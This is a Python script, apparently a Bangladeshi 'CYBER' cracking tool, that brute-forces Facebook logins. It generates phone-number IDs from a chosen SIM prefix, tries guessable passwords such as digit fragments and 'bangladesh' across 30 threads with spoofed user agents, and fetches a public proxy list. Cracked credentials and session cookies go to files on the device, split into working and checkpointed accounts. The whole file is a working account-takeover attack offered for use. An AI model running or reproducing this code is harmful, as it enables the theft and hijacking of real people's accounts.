import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
li="\033[38;5;46m—"

cox=str(f"{li}"*37)        
logo = (""" 
\033[31;1m ╔════╗  ╔═══╗  ╔═╗╔═╗  ╔══╗   ╔═══╗
 \033[31;1m║╔╗╔╗║  ║╔═╗║  ╚╗╚╝╔╝  ╚╣─╝   ║╔═╗║
 \033[31;1m╚╝║║╚╝  ║║─║║  ─╚╗╔╝──  ║║─   ║║─╚╝
 \033[31;1m──║║──  ║║─║║  ─╔╝╚╗──  ║║─   ║║─╔╗
 \033[31;1m──║║──  ║╚═╝║  ╔╝╔╗╚╗  ╔╣─╗   ║╚═╝║
 \033[31;1m──╚╝──  ╚═══╝  ╚═╝╚═╝  ╚══╝   ╚═══╝ """)
logo1 = ("""
\033[31;1m ╔════╗  ╔═══╗  ╔═╗╔═╗  ╔══╗   ╔═══╗
 \033[31;1m║╔╗╔╗║  ║╔═╗║  ╚╗╚╝╔╝  ╚╣─╝   ║╔═╗║
 \033[31;1m╚╝║║╚╝  ║║─║║  ─╚╗╔╝──  ║║─   ║║─╚╝
 \033[31;1m──║║──  ║║─║║  ─╔╝╚╗──  ║║─   ║║─╔╗
 \033[31;1m──║║──  ║╚═╝║  ╔╝╔╗╚╗  ╔╣─╗   ║╚═╝║
 \033[31;1m──╚╝──  ╚═══╝  ╚═╝╚═╝  ╚══╝   ╚═══╝
 \033[31;1m\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════{𝗖𝗬𝗕𝗘𝗥}
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════{𝗖𝗬𝗕𝗘𝗥}
\033[34;1m✮⃝ 𝗖𝗬𝗕𝗘𝗥𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46m𝘽𝙍𝘼𝙉𝘿𝙍𝘿 𝙎𝙊𝙐𝙍𝙊𝙑
\033[34;1m✮⃝ 𝗖𝗬𝗕𝗘𝗥𝄟⃝\x1b[38;5;196m {𝟮}\033[38;5;46m\x1b[38;5;196m╚══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \x1b[38;5;196m𝟶𝟷𝟿𝚡𝚡𝚡𝚡𝚡𝚡𝚡𝚡
\033[34;1m✮⃝ 𝗖𝗬𝗕𝗘𝗥𝄟⃝\x1b[38;5;196m {𝟯}\033[38;5;46m\033[38;5;46m╔══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \033[34;1m𝟶𝟷𝟿𝚡𝚡𝚡𝚡𝚡𝚡𝚡𝚡
\033[34;1m✮⃝ 𝗖𝗬𝗕𝗘𝗥𝄟⃝\x1b[38;5;196m {𝟰}\033[38;5;46m\033[38;5;46m╚══➻〱𝗥𝗔𝗡𝗗𝗢𝗠\033[33;1m➽ \033[33;1m𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟭.𝟬
\033[34;1m✮⃝ 𝗖𝗬𝗕𝗘𝗥𝄟⃝\x1b[38;5;196m {𝟱}\033[38;5;46m\033[33;1m╔══➻〱𝗧𝗢𝗢𝗟𝗦\033[33;1m➽  \033[33;1m𝗖𝗬𝗕𝗘𝗥 \033[31;1m𝗖𝗬𝗕𝗘𝗥 𝟵𝟵
\033[34;1m✮⃝ 𝗖𝗬𝗕𝗘𝗥𝄟⃝\x1b[38;5;196m {𝟲}\033[38;5;46m\033[33;1m╚══➻〱𝗙𝗥𝗢𝗠\033[33;1m➽  \x1b[38;5;196m 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════{𝗖𝗬𝗕𝗘𝗥}""")

def Emranx():
	print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')

def Main():
        os.system("clear")
        print(logo)
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
        print(" \033[38;5;46m〱{𝟭}𝙒𝙊𝙍𝙆 𝙍𝘼𝙉𝘿𝙊𝙈 𝘽𝘿")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
        print(" \033[38;5;46m〱𝕊𝕆𝕌ℝ𝕆𝕍 𝟬𝟮}")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')      
        Emran =input("\n〱\033[38;5;46m𝙀𝙉𝙏𝙀𝙍-𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀: ")
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
        if Emran in ["1"]:
            fuck()
        if Emran in ["2", "00"]:
            exit()
        else:
            exit()
#===========𝙁𝙐𝘾𝙆 𝙔𝙊𝙐          
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    print('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥]𝗦𝗜𝗠𝗘 𝗖𝗢𝗗𝗘〱\x1b[38;5;196m𝟬𝟭𝟳〱\033[34;1m𝟬𝟭𝟴〱\033[33;1m𝟬𝟭𝟵〱\x1b[38;5;196m𝟬𝟭𝟲')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    code = input('〱\033[38;5;46m{𝗖𝗬𝗕𝗘𝗥}〱𝗖𝗛𝗢𝗜𝗖𝗘 : ')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    print('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥]𝙇𝙈𝙏〱\033[34;1m𝟮𝟬𝟬𝟬〱\033[34;1m𝟯𝟬𝟬𝟬〱\033[33;1m𝟱𝟬𝟬𝟬〱\x1b[38;5;196m𝟭𝟬𝟬𝟬𝟬')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    limit = int(input('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥]〱𝗖𝗛𝗢𝗜𝗖𝗘 : '))
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
        print('╔══➻👉〱\033[38;5;46m𝘾𝙔𝘽𝙀𝙍\x1b[38;5;196m〱𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞\033[34;1m𝗜𝗗〱'+tl)
        print("╚══➻👉〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥\033[37;1m〱𝗦𝗜𝗠𝗘\x1b[38;5;196m𝗖𝗢𝗗𝗘〱"+code)
        print('╔══➻👉〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥\033[38;5;46m〱𝗪𝗢𝗥𝗞\x1b[38;5;196m〱𝗪𝗜𝗙𝗜\033[34;1m𝗗𝗔𝗧𝗔')
        print('╚══➻👉〱\033[38;5;46m𝟵𝟵\x1b[38;5;196m〱𝗣𝗔𝗜𝗗\033[34;1m𝗖𝗢𝗠𝗠𝗔𝗡𝗗')
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(emran2,uid,pwx,tl)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
    print('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥] Crack process has been completed')
    print('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 𝟵𝟵] OK Ids saved in CYBER/OK.txt')
    print('〱\033[38;5;46m𝗖𝗬𝗕𝗘𝗥] CP Ids s═════aved in CYBER/CP.txt')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗖𝗬𝗕𝗘𝗥')
def emran2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()           
            sys.stdout.write('\r\033[38;5;46m〱𝗖𝗬𝗕𝗘𝗥〱%s/%s〱𝗖𝗣-𝗶𝗗➲%s➲😓〱𝗢𝗞-𝗜𝗗➲👉%s\r'%(loop,tl,len(cps),len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}            
            header_freefb = {'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3171"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text           
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝗜𝗗-------➲🥰🥰       
                print(f"""
\033[33;1m𝗖𝗬𝗕𝗘𝗥-𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻👉\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻👉\033[38;5;46m{uid} 
\033[33;1m𝗖𝗬𝗕𝗘𝗥-𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻👉\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻👉\033[38;5;46m{ps}
\033[33;1m𝗖𝗬𝗕𝗘𝗥-𝘾𝙊𝙊𝙆𝙀𝙎(𝗢𝗞✅)\033[38;5;46m{coki}
""")
                open('/sdcard/CYBER/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
 #_________𝗖𝗣_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗟𝗢𝗖𝗞-𝗜𝗗------➲😓😓
                print(f"""
\033[33;1m𝗖𝗬𝗕𝗘𝗥-𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻👉\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻👉\033[38;5;46m{uid} 
\033[33;1m𝗖𝗬𝗕𝗘𝗥-𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻👉\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻👉\033[38;5;46m{ps}
""")
                open('/sdcard/CYBER-𝗖𝗣✅-𝗜𝗗✅-𝗜𝗗.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
